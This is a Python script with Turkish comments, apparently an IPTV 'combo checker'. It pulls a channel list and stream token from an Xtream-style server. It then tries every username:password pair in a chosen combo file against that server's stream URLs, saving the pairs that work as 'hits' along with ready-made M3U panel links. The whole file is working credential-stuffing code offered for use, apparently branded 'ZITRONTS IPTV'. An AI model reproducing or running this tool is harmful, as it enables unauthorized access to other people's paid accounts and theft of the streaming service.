import requests
from urllib.parse import urlparse, parse_qs
import time
import os
import pathlib
import re
import subprocess
ses= requests.Session()
# M3U linkini kullanıcıdan al
m3u_link = input("M3U linkini girin: ")
headers = {
        "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "VLC"
    }
# Linki parselere böl
parsed_url = urlparse(m3u_link)
query_params = parse_qs(parsed_url.query)
full_url = parsed_url.scheme + "://" + parsed_url.netloc
user = query_params['username'][0]
pas = query_params['password'][0]
wait_time_input = input("""\33[1;91m[ \33[0m?\33[1;91m ]\33[0m\33[1;31m GECİKME SÜRESİ EKLE : \33[0m""")
wait_time = int(wait_time_input) if wait_time_input.isdigit() else 0
# Kanal sayısını hesapla
channel_url = f"{full_url}/player_api.php?username={user}&password={pas}&action=get_live_streams"
channel_response = ses.get(channel_url, headers=headers, timeout=3, verify=False)
# Hata kontrolü
if channel_response.status_code != 200:
    print("Kanal bilgileri alınamadı.")
    exit()

channel_data = channel_response.json()
total_channel_count = len(channel_data)
print("Toplam Kanal Sayısı:", total_channel_count)

# Medya URL adreslerini ve channel id'lerini bul
media_link_list = []
channel_ids = []
for channel_info in channel_data:
    channel_id = str(channel_info["stream_id"])
    channel_ids.append(channel_id)
    media_url = f"http://{full_url.split('//')[1]}/live/{user}/{pas}/{channel_id}.ts"
    media_link_list.append(media_url)

def check_location_status(location, headers):
    response = requests.get(location, headers=headers, stream=True)
    if response.status_code == 200 and 'video' in response.headers.get('Content-Type'):
        print("Location URL'si aktif.")
    else:
        print("Location URL'si aktif değil veya erişilemiyor.")
# Medya URL adresini kontrol etmek için fonksiyon tanımla
def get_media_info(url, headers):
    response = ses.get(url, headers=headers, allow_redirects=False)

    if response.status_code == 302:
        location = response.headers.get('Location')
        return location

    return None


# Çalışan bir kanal bulana kadar kontrol et
for media_url, channel_id in zip(media_link_list, channel_ids):
    channel_name = next(
        (channel_info["name"] for channel_info in channel_data if channel_info["stream_id"] == int(channel_id)), None)
    channel_info_str = f"Denenen Kanal: {channel_name} ({channel_id})"
    print(f"{channel_info_str}\r", end='')
    
    location = get_media_info(media_url, headers)
    if location:
        token = urlparse(location).query
        
        dns = urlparse(location).netloc
        print("\nÇalışan Kanal ", channel_name)
        dns = dns.replace("http://", "")
        dns = dns.replace("/", "")
        portal = dns
        fx = portal.replace(':', '_')
        print("DNS:", portal)
        print("Location:", location)
        check_location_status(location, headers)
        break
    else:
        time.sleep(0)
        

# Combo dosyasını seçme fonksiyonu
def select_combo_file():
    pattern = "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
    subprocess.run(["clear", ""])
    
    say = 0
    hit = 0
    total_say = 0
    total_hit = 0
    cpm = 1

    feyzo = """
    \33[32m'
    \33[0m"""

    print(feyzo)

    say = 0
    dsy = ""
    dir = '/sdcard/zitronts/combo/'
    for files in os.listdir(dir):
        say = say + 1
        dsy = dsy + "    " + str(say) + "-) " + files + '\n'

    print("""Aşağıdaki listeden combonuzu seçin!!!

 """ + dsy + """
 
\33[33mCombo klasörünüzde """ + str(say) + """ adet dosya bulundu !
""")
    
    dsyno = str(input(" \33[31mCombo No =\33[0m"))
    
    say = 0
    for files in os.listdir(dir):
        say = say + 1
        if dsyno == str(say):
            dosyaa = (dir + files)
    
    say = 0
    print(dosyaa)
    return dosyaa


# Çalışan kombinasyonu tespit etmek için fonksiyon tanımla
def check_combo(url):
    response = requests.get(url, stream=True)
    if response.status_code == 200 and 'video' in response.headers.get('Content-Type'):
        return True
    return False

def yaz(kullanici):
        klasor_yolu = '/sdcard/hits/b/'
        dosya_adi = ''
        dosya_adi = f'🌀DED🌀 {fx}.txt'

        dosya_yolu = os.path.join(klasor_yolu, dosya_adi)
        if not os.path.exists(klasor_yolu):
        	os.makedirs(klasor_yolu)

        dosya = open(dosya_yolu, 'a+', encoding='utf-8')
        dosya.write(kullanici)
        time.sleep(2)
        dosya.close()

# Çalışan kombinasyonu tespit etmek için fonksiyon tanımla
def find_working_combo():
    combo_file = select_combo_file()
    pattern = "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"

    subprocess.run(["clear", ""])

    combo = combo_file
    dosya = ""
    file = pathlib.Path(combo)
    if file.exists():
        print("Dosya Bulundu")
    else:
        print("\33[31mDosya Bulunamadı..! \33[0m")
        dosya = "yok"

    if dosya == "yok":
        exit()

    subprocess.run(["clear", ""])
    
    total_say = 0
    total_hit = 0

    for fyz in open(combo, 'r'):
        up = re.search(pattern, fyz, re.IGNORECASE)
        if up:
            fyzz = fyz.split(":")
            try:
                userr = fyzz[0].replace(" ", "")
            except:
                userr = 'feyzo'
            try:
                passs = fyzz[1].replace(" ", "")
                passs = passs.replace('\n', "")
            except:
                passs = 'feyzo'
                
            headers = {
                "Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
                "X-User-Agent": "Model: MAG254; Link: Ethernet",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip, deflate",
                "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "User-Agent": "VLC"
            }
            url = f"http://{portal}/live/{userr}/{passs}/{channel_id}.ts?{token}"
            time.sleep(wait_time)
            linkor="http://"+ full_url + "/get.php?username=" + userr + "&password=" + passs + "&type=m3u_plus"
            
            total_say += 1
            if check_combo(url):
                total_hit += 1
                mt="""
📜 🅂🄴🅁🅅🄴🅁 📜 
Host ➤ http://{}
Yayın ip ➤ http://{}
Kullanıcı ➤ {}
Şifre ➤ {}""".format(full_url,portal, userr, passs)
                mtl="""
🔗 Ⓜ③Ⓤ Ⓟⓐⓝⓔⓛ➤ {}\n──DZD ZITRONTS IPTV──⧳ """.format(linkor)
                print(mt)
                yaz(mt+mtl+'\n')
                time.sleep(3)
            os.system("clear")

            print(f"\33[1;37m╭─⧪ Özet Ekranı ───────────")
            print("├ℹ️  \33[1;31mHedef Dns: \33[1;36m{}\33[0m".format(portal))
            print("├🌐  \33[1;33mKontrol Edilen : \33[1;36m{}\33[0m".format(total_say))
            print("├ℹ️  \33[1;31mKontrol Edilecek T.: {}\33[0m".format(len(list(open(combo)))))
            print("├🔑  \33[1;31mHit Sayısı:" + str(check_location_status(location, headers) ) +"\33[0m")
            print("├🔑  \33[1;31mHit Sayısı:" + str(total_hit) +"\33[0m")
            print("\r\33[32m├⚠️ " + portal + "\n\33[0m"+
                  "├💔 Total: \33[1;32m" + str(total_channel_count) + "   \33[31m Hit:" + str(total_hit) + "\033[0m\n├➡️ " + userr +   "-" + passs + "   \033[96m\n", end='')
                  
   
find_working_combo()

